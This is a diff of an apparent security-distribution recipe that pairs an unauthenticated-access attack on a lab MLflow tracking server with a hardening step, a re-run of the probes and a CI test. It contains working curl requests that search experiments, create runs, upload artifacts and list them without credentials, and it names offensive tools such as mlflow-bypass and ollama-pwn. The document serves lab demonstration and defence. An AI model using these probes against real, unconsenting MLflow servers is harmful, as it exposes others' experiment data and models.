@@ -3,116 +3,178 @@ title: "Recipe: attack the platform, then verify"
 toc-title: Recipe
 ---
 
-**Tool:** mlflow-bypass + mlflow · **Section:** Attack–defence pairs ·
-**Level:** hard · **Time:** ~45 min · **Layer/Category:** ATTACK A-7 +
-OPS O-1 · **Tags:** pair, attack, mlflow, exp, platform
+| Field | Value |
+|---|---|
+| Tools | `mlflow-bypass` (A-7, exp) ↔ `mlflow` (O-1 lab target) |
+| Section | Attack–defence pairs |
+| Level | hard |
+| Time | ~45 min (lab boot + probe pair + posture flip) |
+| Layer/Category | ATTACK / A-7 + OPS / O-1 |
+| Tags | `pair`, `platform`, `mlflow`, `exp`, `owasp-llm02`, `owasp-llm10` |
 
 ## Problem
 
 The pairing thesis is Kailash's core idea: deployment + attack in one
-declared environment. You suspect an exposed MLflow tracking server
-(sensitive-info + platform exploitation: the attack row maps OWASP
-LLM02 and LLM10). You want to demonstrate the exploitation against
-the lab-default posture, then prove the same declaration hardened
-closes the hole — with both sides reproducible, and a standing CI
-test asserting the pairing.
+declared environment. An MLflow tracking server shipping the
+lab-default posture (`services.kailash.mlflow` on `:5000`,
+`labReachable`, no auth by declared design) exposes experiment
+metadata, run data and model artefacts to anyone who can reach the
+port — the manifest maps this to OWASP LLM02 (sensitive information
+disclosure) and LLM10 (unrestricted consumption) and to ATLAS
+AML.T0049/T0050. You want to demonstrate the exposure against the
+declared lab target, then prove the hardened posture closes it — with
+both legs reproducible, and a standing CI test asserting the pairing
+independent of your lab session.
 
 ## Solution
 
-Kailash ships both ends: the O-1 lab target (`mlflow`, module
-packaging, `services.kailash.mlflow` — lab-accurate vulnerable-ish
-defaults that are DOCUMENTED, not improvised) and the A-7 exploit
-tool (`mlflow-bypass`, exp-classified, manifest-pinned):
+Kailash ships both ends as manifest rows — the O-1 target is a
+service module, the A-7 attack surface is exp-gated. The landed
+instrument for the pairing is the **`kailash-integration-mlflow-attack`
+probe pair** (`tools/vm-integration-mlflow-attack.sh` in the OS
+repo — verbatim MLflow API shapes, live-probed on mlflow 3.x at the
+packages pin), driven against the `platform` profile (the posture
+`tests/integration-mlflow-attack.nix` boots):
 
 ```bash
-# 1. Stand up the lab target (the OPS module's declared service)
-#    kailash.layers.ops.categories.o-01-mlops-ml-engineering.enable = true;
-#    services.kailash.mlflow.enable = true;        # + the module's
-#    hardened-posture options (see provenance note)
-sudo nixos-rebuild switch
+# 1. Boot the lab target in the documented acceptance posture
+#    (the shape from tests/integration-mlflow-attack.nix):
+#      services.ollama.host = "0.0.0.0";
+#      services.ollama.loadModels = [ "qwen2.5:0.5b" ];
+#      services.kailash.mlflow.labReachable = true;
+#      kailash.layers.attack.categories.a-07.enable = true;
+#    (a qemu user-net VM is an isolated lab segment; see
+#     [Boot a verified release image](../getting-started/first-image.html)
+#     for the target's build ref)
 
-# 2. Open the exp double-key gate for the attack tool
-#    (host key + shell key — full walk:
-#     ../admin/lab-mode-gating.html)
-#      kailash.labMode = true;      # host key, config + rebuild
-KAILASH_LAB_MODE=1 mlflow-bypass --help
-#    -> the gate passes; the tool's real help prints
-
-# 3. Run the probes as their --help states them, against the
-#    lab-default (unauthenticated) target
-KAILASH_LAB_MODE=1 mlflow-bypass <args from --help> \
-    --target http://127.0.0.1:5000
-#    -> the bypass lands: experiment/artifact listing exposed
-
-# 4. Verify: flip the lab target's POSTURE with a configuration
-#    change, rebuild
-sudo nixos-rebuild switch
-
-# 5. Re-run the SAME probes from the same box (same seed/args)
-KAILASH_LAB_MODE=1 mlflow-bypass <same args> --target http://127.0.0.1:5000
-#    -> refused / no listing: the declaration change closed the surface
+# 2. In-guest run (the instrument, inside the booted VM):
+kailash-integration-mlflow-attack --seed
+#    ...or from the host against the qemu hostfwd ports:
+kailash-integration-mlflow-attack \
+    --mlflow-url http://127.0.0.1:5101 \
+    --artifacts-url http://127.0.0.1:5102 --seed
 ```
 
-What success looks like:
+What the probe pair does (each stage's verdict prints
+ATTEMPTED/ok/FAIL, and every stage's raw response is echoed — never a
+fabricated PASS):
 
-- run A (lab-default posture): the bypass succeeds and the listing is
-  asserted — the same assertion the repo's integration test makes
-- run B (hardened posture): the same probes fail — a diff of the two
-  runs states the surface closed with the configuration change
-- the exp gate visibly refused every step 3 shape at any wrong key
-  combination along the way
-- the standing proof exists without you: the OS repo's
-  `integration-mlflow-attack.nix` asserts lab-default MLflow +
-  `mlflow-bypass` → listing on every relevant CI run (the pairing
-  thesis, executed)
+```bash
+# stage 1 — TRACKING: the O-1 surface is UNAUTHENTICATED:
+curl -fsS -X POST http://127.0.0.1:5000/api/2.0/mlflow/experiments/search \
+     -H 'Content-Type: application/json' -d '{"max_results":50}'
+#    -> 200 JSON with the experiments list, NO credentials presented
+
+# stage 2 — BYPASS, seeded (the full unauthenticated write→read round trip):
+curl -fsS -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \
+     -H 'Content-Type: application/json' \
+     -d '{"experiment_id": "0", "run_name": "MLFLOW_BYPASS_LIST"}'
+#    -> .run.info.run_id parsed from the response
+
+curl -fsS -X PUT 'http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/put?path=0%2F<run-id>%2Fartifacts%2Fka23-listing.txt' \
+     -F 'file=@<marker-file>'
+#    -> the marker artefact lands through the SAME unauthenticated store
+
+curl -fsS 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/artifacts/list?run_id=<run-id>&path='
+#    -> the artefact listing answers; write→read round trip proven
+```
+
+Then the verification leg — flip the posture with a configuration
+change and re-run the same probes:
+
+```bash
+# 3. Harden the lab target in the system configuration:
+#      services.kailash.mlflow.labReachable = false;   # loopback-only
+#    + the module's auth posture options at the current release
+#    (read the module per release — never invented here), then:
+sudo nixos-rebuild test
+
+# 4. Re-run the same probe pair, same box:
+kailash-integration-mlflow-attack --seed
+#    -> both probes FAIL: the auth gate is up; the surface is closed
+```
+
+Expected output shape (abridged):
+
+```
+== KA-23 integration-mlflow-attack acceptance pair ==
+tracking : http://127.0.0.1:5000
+artifacts: http://127.0.0.1:5000 (seed: 1)
+--- boot-wait: polling http://127.0.0.1:5000/health (window: 300s)
+boot-wait: REACHABLE — /health: <body>
+--- track: POST /api/2.0/mlflow/experiments/search (UNAUTH)
+{"experiments": [...]}
+track: ok — experiments/search answered unauthenticated (ML_METHOD_FLAG surface UP)
+--- bypass(seed): POST /api/2.0/mlflow/runs/create (UNAUTH)
+<create response with run_id>
+--- bypass(seed): PUT /api/2.0/mlflow-artifacts/artifacts/put (UNAUTH multipart)
+--- bypass: GET /ajax-api/2.0/mlflow/artifacts/list (UNAUTH)
+{"files": [...]}
+bypass: ok — the artefact listing answered unauthenticated
+kailash-integration-mlflow-attack: BOTH probes ok (track + bypass listing)
+```
 
 ## Discussion
 
-- **Why this pair is the thesis:** the manifest rows mean it —
-  `mlflow-bypass` says "pairs with the O-1 lab target", and the O-1
-  module ships the platform target as a first-class service. One
-  declared environment produces both the finding and the verification;
-  no hand-assembled lab whose posture drifts between runs.
-- **The attack tool is exp + the LICENCE IS UNKNOWN:** the manifest
-  row records `LicenseRef-Unknown` — possession and use in your lab
-  is your compliance decision; treat the tool's redistribution as
-  unrestricted-by-default until the row's licence is established.
-- **ATLAS mapping is the row's record:** the A-7 tool carries
-  AML.T0049/T0050 (dataset-verified ids, per the packaging lane),
-  the OWASP LLM02/LLM10 mapping sits on both epochs. Cite the row's
-  ids in reports; don't re-derive them by memory.
-- **Hardened postures are configuration, not folklore:** the exact
-  hardened options for the lab target are read from its module and
-  documented per release (see provenance note) — flipping the
-  posture is a declaration edit plus a rebuild, and the previous
-  generation remains one reboot away (see
-  [Ride a release without breaking pinned tooling](../admin/updates.html)).
-- **Beyond MLflow:** A-7's sister rows (`triton-pwn` etc.) pair the
-  same way with their O-2 docker-wrapper targets; the recipe pattern
-  is identical — lab target up, gate open, probes run, posture flip,
-  same-seed re-run, diff as the evidence.
+- **Why the probe pair and not a bespoke exploit script:** the
+  manifest's `mlflow-bypass` row is `safety.level: exp` and the
+  upstream repository it pins is currently **missing** — the
+  2026-10-13 lane record on
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+  is a missing-repository note. The probe pair still runs the REAL
+  protocol against the REAL target — the two verbatim MLflow API
+  recipes (unauthenticated tracking search + the `ajax-api` artefact
+  listing with the `--seed` write→read round trip) — so the
+  acceptance runs an executable, honest pairing NOW, and the REAL
+  tool takes over when its repository lands. Never invent a tool's
+  CLI to fill that gap.
+- **The verdict discipline carries the evidence:** every probe prints
+  ATTEMPTED/ok/FAIL (never "PASS") and echoes its verbatim output.
+  With `--record`, the verbatims land in a machine-validated JSON
+  record (`tests/vm-acceptance-mlflow-record.json`) whose verifier
+  leg fails CI on a hand-typed ok with nothing behind it — the same
+  no-invented-evidence rule this book runs on.
+- **Why the posture flip is the verification:** the lab posture
+  (`labReachable = true`) and the hardened posture (loopback/auth
+  options at the current pin) are declared options on the SAME
+  module. A diff of the two probe runs IS the evidence that a
+  configuration change — not folklore — moved the surface; the
+  previous generation stays one reboot away (see
+  [Ride a release without breaking pinned
+  tooling](../admin/updates.html)).
+- **CI runs this pairing whether or not you do:** hosted CI evals
+  `integration-mlflow-attack.nix` (never boots it — the no-VMs
+  posture), and the maintainer's ONE interactive boot is recorded in
+  the machine-validated record your `--record` run should match. Your
+  lab session reproduces the CI assertion hands-on.
+- **The exp gate still owns the A-7 row:** when the real
+  `mlflow-bypass` derivation lands it installs only via the
+  double-key lab gate (full walk:
+  [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html)). The probe pair needs no
+  gate — it drives curl/jq/python3 from the base system.
+- **Beyond MLflow:** A-7's sister rows (`triton-pwn`, `torchserve-pwn`,
+  `ollama-pwn`, `vllm-pwn`, `shadow-ray`, `vector-db-ripper`) pair
+  the same way with their O-0x targets; the transferable pattern is:
+  lab target up → probes run → posture flip → same-seed re-run →
+  diff as the evidence.
 
 ## See also
 
-- [Gate lab-mode and exp-classified
-  tools](../admin/lab-mode-gating.html) — step 2's full walk
 - [Serve a local model for
   scanning](../ops/serve-a-model.html) — the model-surface analog
   (O-4 target for A-2 scanners)
-- `mlflow-bypass` row in the manifest:
-  <https://github.com/kailash-os/kailash-packages/blob/main/manifest/tools.yaml>
+- [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html) — the exp gate walk
+- The landed probe pair source (verbatim API recipes):
+  <https://github.com/kailash-os/kailash-os/blob/master/tools/vm-integration-mlflow-attack.sh>
+- The integration test that asserts the pairing:
+  <https://github.com/kailash-os/kailash-os/blob/master/tests/integration-mlflow-attack.nix>
+- Upstream missing-repository note:
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
 - [Recipe directory](../directory.html)
 
 ---
 
-**Recipe provenance.** The pairing structure (O-1 lab target +
-`services.kailash.mlflow`, A-7 `mlflow-bypass` exp row, the
-integration test asserting the pairing) is the landed contract per
-the OS spec's test chapter and the manifest rows (verified
-2026-10-14 at main/master). Deliberately NOT quoted as landed: the
-exploit tool's exact flag surface (read from its own `--help` — the
-pinned derivation's CLI is the record) and the lab target's hardened
-posture option names (read from the module per release). A hands-on
-worked run of both legs against real pins: PENDING — the CI-side
-pairing assertion (`integration-mlflow-attack.nix`) is the standing
-instrument until the upkeep lane lands the host walkthrough.
+ref: [mlflow 3.x pin + OS master test sources](https://github.com/kailash-os/kailash-os/blob/master/tools/vm-integration-mlflow-attack.sh) - verified 2026-10-14.
+upstream mlflow-bypass repo missing: [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23).
